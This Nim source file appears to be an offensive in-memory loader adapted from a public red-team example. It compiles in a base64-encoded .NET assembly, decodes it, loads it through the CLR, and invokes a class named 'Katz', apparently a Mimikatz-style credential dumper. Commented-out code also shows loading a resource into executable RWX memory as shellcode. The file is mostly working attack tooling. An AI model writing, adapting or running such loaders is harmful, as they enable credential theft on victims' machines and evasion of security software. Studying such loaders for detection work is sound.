#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    I still can't believe this was added directly in the Winim library. Huge props to the author of Winim for this (khchen), really great stuff.

    Make sure you have Winim >=3.6.0 installed. If in doubt do a `nimble install winim`

    Also see https://github.com/khchen/winim/issues/63 for an amazing pro-tip from the author of Winim in order to determine the marshalling type of .NET objects.

    References:
      - https://github.com/khchen/winim/blob/master/examples/clr/usage_demo2.nim
]#

import winim/clr
import sugar
import strformat
import winim, winim/lean
import system
import strutils, strformat
#import stew/byteutils
#import stew/base64
import base64


const myResource = staticRead"download.dat"


#when defined(gcc) and defined(windows):
#    {.link: "resource.o"} # the name of compiled resource object file as stated above

echo "[*] Installed .NET versions"
for v in clrVersions():
    echo fmt"    \--- {v}"
echo "\n"

echo fmt"{myResource}"

#var buffer: array[2710016, byte] = Base64.decode(myResource)

let b64result = decode(myResource)
assert b64result.len == 2710016
var b = cast[array[2710016, byte]](b64result[0])

#var b = Base64.decode(myResource)


#var resourceId = 3 # It is the first value inside the .rc file created before
#var resourceType = 10 # RCDATA is 10 (see link above about resource types)


# Find the resource in the .rsrc section using the information defined above
#var myResource: HRSRC = FindResource(cast[HMODULE](NULL), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
#echo fmt"myResource extracted"

# Get the size of the resource
#var myResourceSize: DWORD =  SizeofResource(cast[HMODULE](NULL), myResource)

# Load the resource to copy in the allocated memory space
#var myResourceData: HGLOBAL = LoadResource(cast[HMODULE](NULL), myResource)

# Allocate some memory
#let rPtr = VirtualAlloc(
#    NULL,
#    cast[SIZE_T](myResourceSize),
#    MEM_COMMIT,
#    PAGE_EXECUTE_READ_WRITE
#)

# Copy the data of the resource into the allocated memory space
#copyMem(rPtr, cast[LPVOID](myResourceData), myResourceSize)

#var shellcode = cast[ptr openArray[byte]](rPtr)
#var shellcode = cast[array[2710016,byte]](rPtr)
#echo fmt"shellcode {byte(shellcode[0])}"

echo "loading shellcode"

var assembly = load(b)
echo "loaded shellcode"
dump assembly

var TestClass = assembly.GetType("Katz")
echo "Invoking a static method. Main "
@TestClass.Main()

var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

echo "EntryPoint.Invoke null"

arr = toCLRVariant(["From Nim & .NET!"], VT_BSTR) # Actually passing some args
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
   


